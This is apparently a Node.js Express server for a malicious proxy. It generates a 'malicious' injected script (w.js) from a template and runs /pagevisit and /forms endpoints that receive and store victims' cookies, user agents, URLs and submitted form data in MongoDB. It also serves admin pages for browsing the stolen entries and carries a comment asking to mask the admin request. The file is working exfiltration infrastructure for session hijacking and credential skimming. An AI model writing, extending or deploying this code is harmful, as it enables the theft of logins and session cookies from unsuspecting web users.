const express = require("express")
const mongoose = require("mongoose")
var PageVisit = require("./models/pagevisit")
var FormSubmit = require("./models/formsubmit")
const crypto = require("crypto")
const ejs = require("ejs")
const fs = require("fs")
const https = require("https")
const http = require("http")
// require("dotenv").path({path:__dirname+'/.env'})

// Listen on the default MongoDB port
const mongoDBUrl = process.env.MONGODB_URL
const NODE_PORT = process.env.NODE_HTTP_PORT
const NODE_PORT_SSL = process.env.NODE_HTTPS_PORT
const NODE_ADDR = process.env.NODE_ADDRESS
const CURRENT_IP = process.env.PUBLIC_IP

sslOptions = {
	// Private key in PEM format
    key: fs.readFileSync('/ssl/squidCA.pem'),
	// Cert chain in PEM format
    cert: fs.readFileSync('/ssl/squidCA.pem')
}

mongoose.connect(mongoDBUrl, { useNewUrlParser: true }, function (err) {
	 if (err) throw err;
	 console.log('Successfully connected'); 
})

// var PageVisit = mongoose.model('PageVisit', pageVisitSchema)
// will need another schema for form submitions

var app = express()
app.set('view engine','ejs')
app.use( express.json() )

app.use((req,res,next) => {
	// console.log("adding cors")
  res.append('Access-Control-Allow-Origin', ['*']);
  res.append('Access-Control-Allow-Methods', 'GET,POST');
  res.append('Access-Control-Allow-Headers', 'Content-Type');
	next()
})

app.use(express.static(__dirname+'/public'))

//needs current server ip
//creats file called w.js
function generateJS(ip,port){
	//render javascript from ejs template	
	ejs.renderFile(__dirname+'/malicious.ejs',
		{ 	ip: ip,
			port: port
		}, (err, data)=>{
        if(err){
            console.log("Error generating w.js")
            console.log(err)
            throw err
        }
        console.log("Rendered w.js, writing to "+ "/generated_js/w.js")
        fs.writeFile("/generated_js/w.js", data, function(err){
            if (err) throw err
        })
	})
}

function getip(req){
	// var ip = req.headers['x-forwarded-for'] || 
	var ip = req.connection.remoteAddress || 
     req.socket.remoteAddress ||
     (req.connection.socket ? req.connection.socket.remoteAddress : null)
  return ip
}

app.post('/pagevisit', function(req,res){
	//var ip = getip(req)
	var ip = req.body.sender
    var useragent = req.body.userAgent
	var OS = req.body.operatingSystem
	var cookies = req.body.cookies
	var _url = req.body.url
	var time = Date.now()

	var data = JSON.stringify({
		ip, 
		useragent,
		OS,
		cookies,
		_url,
		time
	})

	var _md5 = crypto.createHash('md5').update(data).digest("hex");
	
	console.log("["+_md5+"] Page visit")
	console.log("["+_md5+"] URL",_url)
	console.log("["+_md5+"] OS",OS)
	console.log("["+_md5+"] useragent:", useragent)
	console.log("["+_md5+"] cookies",cookies)
	console.log("["+_md5+"] time",time)

	//upload data to db
	var pageVisitObj = new PageVisit ({
		_id: new mongoose.Types.ObjectId(),
    	ip: ip,
		url: _url,
		OS: OS,
		userAgent: useragent,
		cookies: cookies,
		md5cookie: _md5
	})

	pageVisitObj.save(function(err) {
	   if (err) throw err
	   console.log('['+ip+'] Saved page.')
	})
	res.status(200)
	res.send(_md5) 
	res.end()
})

app.post('/forms', function(req,res) {
	
	//var ip = getip(req)
	var ip = req.body.sender
	// {type: string, name: string, value:string }
    var formData = req.body.data
	var _url = req.body.url
	var cookies = req.body.cookies
	var useragent = req.body.userAgent
	var _md5 = req.body.link

	console.log("["+_md5+"] Forms submital")
	console.log("["+_md5+"] URL",_url)
	console.log("["+_md5+"] useragent:", useragent)
	console.log("["+_md5+"] cookies",cookies)
	console.log("["+_md5+"] form data",formData)
	console.log("["+_md5+"] md5cookie",_md5)

	//upload data to db
	var formSubmitObj = new FormSubmit ({
		_id: new mongoose.Types.ObjectId(),
    	ip: ip,
		url: _url,
		userAgent: useragent,
		cookies: cookies,
		formData: formData,
		md5cookie: _md5
	})

	formSubmitObj.save(function(err) {
	   if (err) throw err
	   console.log('['+_md5+'] Saved forms.')
	})
	res.status(200)
	res.send("<html></html>") //prevent firefox xmlparsing issures
	res.end()
})

// TODO: mask this request as much as possible please
app.get('/admin',function(req,res){
	var ip = getip(req)
	console.log("["+ip+"] Admin visit page requested")
	res.end()
})

app.get('/admin/visits',function(req,res){
	var ip = getip(req)
	console.log("["+ip+"] Admin visit page requested")

	//fetch ip entries
	PageVisit.find({}, function(err, entries){
		res.render('pages/adminvisits', { 
			title: "Proxy_Monitor - " + ip,
			entries: entries ?? []
		})
	})
})

app.get('/admin/forms',function(req,res){
	var ip = getip(req)
	console.log("["+ip+"] Admin form page requested")

	//fetch ip entries
	FormSubmit.find({}, function(err, entries){
		res.render('pages/adminforms', { 
			title: "Proxy_Monitor - " + ip,
			entries: entries ?? []
		})
	})
})

console.log("Generating malicious JS file...")
generateJS(CURRENT_IP, NODE_PORT_SSL)

//app.listen(NODE_PORT, NODE_ADDR)
// Create an HTTP service.
http.createServer(app).listen(NODE_PORT);
console.log("Listening on http://"+NODE_ADDR+":"+ NODE_PORT)
// Create an HTTPS service identical to the HTTP service.
https.createServer(sslOptions, app).listen(NODE_PORT_SSL);
console.log("Listening on https://"+NODE_ADDR+":"+ NODE_PORT_SSL)

